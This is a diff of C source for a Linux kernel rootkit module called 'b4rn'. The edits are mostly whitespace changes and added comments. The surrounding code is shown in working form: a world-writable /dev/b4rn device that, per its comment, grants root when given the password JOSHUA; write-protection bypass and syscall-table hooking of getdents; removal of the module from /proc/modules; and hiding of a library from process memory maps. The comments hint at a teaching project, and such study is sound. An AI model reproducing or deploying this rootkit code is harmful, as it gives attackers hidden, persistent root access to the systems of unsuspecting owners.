@@ -46,12 +46,12 @@ static int (*fixed_set_memory_ro)(unsigned long, int);
 static struct file_operations* proc_modules_operations;
 static int (*old_seq_show)(struct seq_file *seq, void *v);
 
-#define GETDENTS_SYSCALL_NUM __NR_getdents
+#define GETDENTS_SYSCALL_NUM   __NR_getdents
 #define GETDENTS64_SYSCALL_NUM __NR_getdents64
 #define CR0_WP (1u << 16)
 
 #define HIDE_PREFIX     "libtest.so.1.0"
-#define HIDE_PREFIX_SZ      (sizeof(HIDE_PREFIX) - 1)
+#define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
 #define MODULE_NAME     "b4rn"
 #define MODULE_NAME_SZ  (sizeof(MODULE_NAME)-1)
 
@@ -61,23 +61,25 @@ struct linux_dirent {
     unsigned long   d_ino;
     unsigned long   d_off;
     unsigned short  d_reclen;
-    char        d_name[];
+    char            d_name[];
  };
 
 struct linux_dirent64 {
-	unsigned long long	        d_ino;    /* 64-bit inode number */
-	long long        d_off;    /* 64-bit offset to next structure */
-	unsigned short d_reclen; /* Size of this dirent */
-	unsigned char  d_type;   /* File type */
-	char           d_name[];
+	unsigned long long d_ino;    /* 64-bit inode number */
+	long long          d_off;    /* 64-bit offset to next structure */
+	unsigned short     d_reclen; /* Size of this dirent */
+	unsigned char      d_type;   /* File type */
+	char               d_name[];
  };
-
 
 static int old_uid;
 static int old_gid;
 static int old_euid;
 static int old_egid;
 
+
+// write handler for our /dev/b4rn file
+// if the user provides the password JOSHUA, they elevate to root
 static ssize_t
 barn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
 {
@@ -104,13 +106,14 @@ barn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
 }
 	
 
-// NOP
+// NOP: reads on /dev/b4rn don't return anything
 static ssize_t
 barn_read (struct file * file, char * buf, size_t count, loff_t *ppos)
 {
 	return count;
 }
 
+// boilerplate for /dev files
 static const struct file_operations barnops = {
 	.owner = THIS_MODULE,
 	.read = barn_read,
@@ -118,6 +121,8 @@ static const struct file_operations barnops = {
 };
 
 
+// will appear on /dev/b4rn as a r/w misc char device. 
+// The mode sets the perms to be 0666
 static struct miscdevice barn_dev = {
 	.minor = MISC_DYNAMIC_MINOR, 
 	.name = "b4rn", 
@@ -139,6 +144,7 @@ typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, lo
 // the original read handler
 proc_modules_read_t proc_modules_read_orig = NULL;
 
+
 static inline void
 tlb_flush_hard (void)
 {
@@ -153,8 +159,8 @@ unprotect_page (unsigned long addr)
 	write_cr0(read_cr0() & (~CR0_WP));
 	fixed_set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
 	tlb_flush_hard();
-
 }
+
 
 static inline void
 protect_page (unsigned long addr)
@@ -164,14 +170,16 @@ protect_page (unsigned long addr)
 	tlb_flush_hard();
 }
 
+
 // our new /proc/modules read handler
 static ssize_t 
 proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *offset) 
 {
-	char * kbuf = NULL;
-	char* bad_line = NULL;
+	char * kbuf        = NULL;
+	char* bad_line     = NULL;
 	char* bad_line_end = NULL;
-	ssize_t ret = proc_modules_read_orig(f, buf, len, offset);
+	ssize_t ret        = proc_modules_read_orig(f, buf, len, offset);
+
 	// search in the buf for MODULE_NAME, and remove that line
 	kbuf = kmalloc(ret, GFP_KERNEL);
 	memset(kbuf, 0, ret);
@@ -186,6 +194,7 @@ proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *off
 				break;
 			}
 		}
+
 		// copy over the bad line
 		memcpy(bad_line, bad_line_end, (kbuf+ret) - bad_line_end);
 		// adjust the size of the return value
@@ -197,14 +206,16 @@ proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *off
 	return ret;
 }
 
+
 // TODO: fix this up
 static asmlinkage long 
 sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) 
 {
 	int boff;
-	struct linux_dirent __user * ent;
-	long ret = sys_getdents_orig(fd, dirent, count);
 	char * dbuf;
+	struct linux_dirent __user * ent;
+
+	long ret = sys_getdents_orig(fd, dirent, count);
 
 	if (ret <= 0) {
 		return ret;
@@ -243,8 +254,8 @@ sys_getdents64_new (unsigned int fd, struct linux_dirent64 __user *dirent, unsig
 {
 	int boff;
 	struct linux_dirent64 __user * ent;
-	long ret = sys_getdents64_orig(fd, dirent, count);
 	char * dbuf;
+	long ret = sys_getdents64_orig(fd, dirent, count);
 
 	if (ret <= 0) {
 		return ret;
@@ -326,13 +337,14 @@ init_syscall_tab (void)
     syscall_table = (unsigned long*)find_syscall_table();
 
     // record the original getdents handler
-	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
+	sys_getdents_orig   = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
 	sys_getdents64_orig = (sys_getdents64_t)((void**)syscall_table)[GETDENTS64_SYSCALL_NUM];
 
 	unprotect_page((unsigned long)syscall_table);
 
-    syscall_table[GETDENTS_SYSCALL_NUM] = (unsigned long)sys_getdents_new;
+    syscall_table[GETDENTS_SYSCALL_NUM]   = (unsigned long)sys_getdents_new;
     syscall_table[GETDENTS64_SYSCALL_NUM] = (unsigned long)sys_getdents64_new;
+
 	protect_page((unsigned long)syscall_table);
 
 	return 0;
@@ -364,7 +376,7 @@ hide_seq_show (struct seq_file * seq, void * v)
 	int ret, prev_len, this_len;
 
 	prev_len = seq->count;
-	ret = old_seq_show(seq, v);
+	ret      = old_seq_show(seq, v);
 	this_len = seq->count - prev_len;
 
 	if (strnstr(seq->buf + prev_len, HIDE_PREFIX, this_len))
@@ -391,6 +403,7 @@ hook_pid_maps_seq_show (const char * path)
 	old_seq_show = seq->op->show;
 
 	seq_show_addr = (unsigned long*)&seq->op->show;
+
 	unprotect_page((unsigned long)seq_show_addr);
 	*seq_show_addr = (unsigned long)hide_seq_show;
 	protect_page((unsigned long)seq_show_addr);
